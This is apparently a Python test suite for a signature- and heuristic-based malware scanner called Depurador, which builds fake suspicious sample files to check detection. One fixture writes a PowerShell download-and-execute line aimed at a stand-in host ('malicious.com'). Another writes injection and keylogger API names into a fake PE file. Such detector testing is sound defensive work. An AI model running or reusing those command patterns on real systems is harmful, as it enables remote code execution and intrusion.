"""
Depurador - Test Suite
Script de pruebas para verificar funcionalidad
"""

import os
import sys
import hashlib
from pathlib import Path
from colorama import init, Fore, Style

init(autoreset=True)

# Agregar src al path
sys.path.insert(0, str(Path(__file__).parent / 'src'))

from signature_engine import SignatureEngine
from scanner import SystemScanner
from analyzer import FileAnalyzer
from logger import ScanLogger


class DepuradorTestSuite:
    """Suite de pruebas para Depurador"""
    
    def __init__(self):
        self.base_path = Path(__file__).parent
        self.test_dir = self.base_path / "test_samples"
        self.test_dir.mkdir(exist_ok=True)
        
        # Inicializar componentes
        self.logger = ScanLogger(self.base_path / "logs")
        self.signature_engine = SignatureEngine(self.base_path / "signatures")
        self.analyzer = FileAnalyzer(self.signature_engine, self.logger)
        
        self.tests_passed = 0
        self.tests_failed = 0
    
    def print_header(self, text):
        """Imprimir header de sección"""
        print(f"\n{Fore.CYAN}{'═' * 70}")
        print(f"{Fore.WHITE}{text}")
        print(f"{Fore.CYAN}{'═' * 70}\n")
    
    def print_test(self, name, passed):
        """Imprimir resultado de test"""
        if passed:
            print(f"{Fore.GREEN}[✓] {name}")
            self.tests_passed += 1
        else:
            print(f"{Fore.RED}[✗] {name}")
            self.tests_failed += 1
    
    def test_signature_engine(self):
        """Probar el motor de firmas"""
        self.print_header("TEST 1: Signature Engine")
        
        # Test 1.1: Cargar firmas
        has_hashes = len(self.signature_engine.malware_hashes) > 0
        self.print_test("Load malware hashes", has_hashes)
        
        # Test 1.2: Cargar reglas heurísticas
        has_rules = len(self.signature_engine.heuristic_rules) > 0
        self.print_test("Load heuristic rules", has_rules)
        
        # Test 1.3: Cargar patrones comportamentales
        has_patterns = len(self.signature_engine.behavioral_patterns) > 0
        self.print_test("Load behavioral patterns", has_patterns)
        
        # Test 1.4: Verificar hash conocido
        known_hash = "44d88612fea8a8f36de82e1278abb02f"  # EICAR MD5
        detected = self.signature_engine.check_hash(None, known_hash)
        self.print_test("Detect known malware hash", detected)
        
        # Test 1.5: Verificar patrón de filename
        suspicious_filename = "svchost32.exe"
        detected = self.signature_engine.check_filename_pattern(suspicious_filename)
        self.print_test("Detect suspicious filename pattern", detected)
    
    def test_file_creation(self):
        """Probar creación de archivos de prueba"""
        self.print_header("TEST 2: Test File Creation")
        
        # Test 2.1: Crear archivo limpio
        clean_file = self.test_dir / "clean_file.txt"
        try:
            with open(clean_file, 'w') as f:
                f.write("This is a clean test file")
            self.print_test("Create clean test file", True)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")
            self.print_test("Create clean test file", False)
        
        # Test 2.2: Crear archivo "malicioso" fake
        malicious_file = self.test_dir / "suspicious.exe"
        try:
            with open(malicious_file, 'wb') as f:
                # PE header fake
                f.write(b'MZ\x90\x00\x03\x00\x00\x00\x04\x00')
                f.write(b'\x00' * 50)
                
                # APIs sospechosas
                f.write(b'CreateRemoteThread\x00')
                f.write(b'VirtualAllocEx\x00')
                f.write(b'WriteProcessMemory\x00')
                f.write(b'URLDownloadToFile\x00')
                f.write(b'GetAsyncKeyState\x00')
                
                # Keywords sospechosos
                f.write(b'ransomware bitcoin encrypt payload')
                
                # Padding
                f.write(b'\x00' * 1000)
            
            self.print_test("Create suspicious test file", True)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")
            self.print_test("Create suspicious test file", False)
        
        # Test 2.3: Crear script malicioso fake
        script_file = self.test_dir / "suspicious.ps1"
        try:
            with open(script_file, 'w') as f:
                f.write("# Suspicious PowerShell Script\n")
                f.write("$client = New-Object System.Net.WebClient\n")
                f.write("$client.DownloadString('http://malicious.com/payload')\n")
                f.write("Invoke-Expression $payload\n")
                f.write("Start-Process -WindowStyle Hidden cmd.exe\n")
            
            self.print_test("Create suspicious script file", True)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")
            self.print_test("Create suspicious script file", False)
    
    def test_file_analysis(self):
        """Probar análisis de archivos"""
        self.print_header("TEST 3: File Analysis")
        
        # Test 3.1: Analizar archivo limpio
        clean_file = self.test_dir / "clean_file.txt"
        if clean_file.exists():
            try:
                result = self.analyzer.analyze_file(str(clean_file))
                passed = not result['is_malicious']
                self.print_test("Analyze clean file (should be clean)", passed)
            except Exception as e:
                print(f"{Fore.RED}Error: {e}")
                self.print_test("Analyze clean file", False)
        
        # Test 3.2: Analizar archivo sospechoso
        suspicious_file = self.test_dir / "suspicious.exe"
        if suspicious_file.exists():
            try:
                result = self.analyzer.analyze_file(str(suspicious_file))
                passed = result['is_malicious']
                self.print_test("Analyze suspicious file (should be malicious)", passed)
                
                if result['is_malicious']:
                    print(f"{Fore.YELLOW}  Reasons:")
                    for reason in result['reasons']:
                        print(f"{Fore.YELLOW}    • {reason}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}")
                self.print_test("Analyze suspicious file", False)
        
        # Test 3.3: Analizar script sospechoso
        script_file = self.test_dir / "suspicious.ps1"
        if script_file.exists():
            try:
                result = self.analyzer.analyze_file(str(script_file))
                passed = result['is_malicious']
                self.print_test("Analyze suspicious script (should be malicious)", passed)
                
                if result['is_malicious']:
                    print(f"{Fore.YELLOW}  Reasons:")
                    for reason in result['reasons']:
                        print(f"{Fore.YELLOW}    • {reason}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}")
                self.print_test("Analyze suspicious script", False)
    
    def test_hash_calculation(self):
        """Probar cálculo de hashes"""
        self.print_header("TEST 4: Hash Calculation")
        
        test_file = self.test_dir / "clean_file.txt"
        if test_file.exists():
            try:
                # Calcular hashes manualmente
                sha256_hasher = hashlib.sha256()
                md5_hasher = hashlib.md5()
                
                with open(test_file, 'rb') as f:
                    content = f.read()
                    sha256_hasher.update(content)
                    md5_hasher.update(content)
                
                expected_sha256 = sha256_hasher.hexdigest()
                expected_md5 = md5_hasher.hexdigest()
                
                # Analizar con el sistema
                result = self.analyzer.analyze_file(str(test_file))
                
                sha256_match = result['sha256'] == expected_sha256
                md5_match = result['md5'] == expected_md5
                
                self.print_test("SHA256 calculation", sha256_match)
                self.print_test("MD5 calculation", md5_match)
                
            except Exception as e:
                print(f"{Fore.RED}Error: {e}")
                self.print_test("Hash calculation", False)
    
    def test_scanner(self):
        """Probar el escáner"""
        self.print_header("TEST 5: Scanner Module")
        
        try:
            scanner = SystemScanner(self.signature_engine, self.logger, max_threads=2)
            
            # Escanear directorio de pruebas
            results = scanner.scan_paths([str(self.test_dir)])
            
            has_scanned = results['total_scanned'] > 0
            self.print_test("Scan test directory", has_scanned)
            
            has_threats = results['threats_found'] > 0 or results['suspicious_found'] > 0
            self.print_test("Detect threats in test samples", has_threats)
            
            print(f"\n{Fore.CYAN}Scan Results:")
            print(f"{Fore.WHITE}  Files Scanned: {results['total_scanned']}")
            print(f"{Fore.RED}  Threats: {results['threats_found']}")
            print(f"{Fore.YELLOW}  Suspicious: {results['suspicious_found']}")
            print(f"{Fore.GREEN}  Clean: {results['clean_files']}")
            
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")
            self.print_test("Scanner test", False)
    
    def test_logging(self):
        """Probar el sistema de logging"""
        self.print_header("TEST 6: Logging System")
        
        # Verificar que se creó el directorio de logs
        logs_exist = (self.base_path / "logs").exists()
        self.print_test("Logs directory created", logs_exist)
        
        # Verificar que se creó el log principal
        main_log = self.base_path / "logs" / "depurador.log"
        main_log_exists = main_log.exists()
        self.print_test("Main log file created", main_log_exists)
        
        # Verificar que hay reportes
        reports = list((self.base_path / "logs").glob("scan_report_*.txt"))
        has_reports = len(reports) > 0
        self.print_test("Scan reports generated", has_reports)
    
    def cleanup(self):
        """Limpiar archivos de prueba"""
        self.print_header("CLEANUP")
        
        try:
            # Preguntar si quiere eliminar archivos de prueba
            print(f"{Fore.YELLOW}Do you want to delete test files? (y/n): ", end='')
            choice = input().strip().lower()
            
            if choice == 'y':
                for file in self.test_dir.glob('*'):
                    try:
                        file.unlink()
                    except Exception:
                        pass
                try:
                    self.test_dir.rmdir()
                    print(f"{Fore.GREEN}[✓] Test files deleted")
                except Exception:
                    print(f"{Fore.YELLOW}[!] Could not delete test directory")
            else:
                print(f"{Fore.CYAN}[i] Test files kept in: {self.test_dir}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Error during cleanup: {e}")
    
    def print_summary(self):
        """Imprimir resumen de tests"""
        self.print_header("TEST SUMMARY")
        
        total = self.tests_passed + self.tests_failed
        percentage = (self.tests_passed / total * 100) if total > 0 else 0
        
        print(f"{Fore.GREEN}Tests Passed:  {self.tests_passed}")
        print(f"{Fore.RED}Tests Failed:  {self.tests_failed}")
        print(f"{Fore.CYAN}Total Tests:   {total}")
        print(f"{Fore.WHITE}Success Rate:  {percentage:.1f}%\n")
        
        if self.tests_failed == 0:
            print(f"{Fore.GREEN}{'═' * 70}")
            print(f"{Fore.GREEN}ALL TESTS PASSED! ✓")
            print(f"{Fore.GREEN}{'═' * 70}\n")
        else:
            print(f"{Fore.YELLOW}{'═' * 70}")
            print(f"{Fore.YELLOW}SOME TESTS FAILED")
            print(f"{Fore.YELLOW}{'═' * 70}\n")
    
    def run_all_tests(self):
        """Ejecutar todas las pruebas"""
        print(f"\n{Fore.CYAN}{'═' * 70}")
        print(f"{Fore.WHITE}DEPURADOR TEST SUITE")
        print(f"{Fore.CYAN}{'═' * 70}\n")
        
        self.test_signature_engine()
        self.test_file_creation()
        self.test_file_analysis()
        self.test_hash_calculation()
        self.test_scanner()
        self.test_logging()
        
        self.print_summary()
        self.cleanup()


def main():
    """Ejecutar suite de tests"""
    try:
        test_suite = DepuradorTestSuite()
        test_suite.run_all_tests()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Tests interrupted by user")
    except Exception as e:
        print(f"{Fore.RED}[✗] Fatal error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()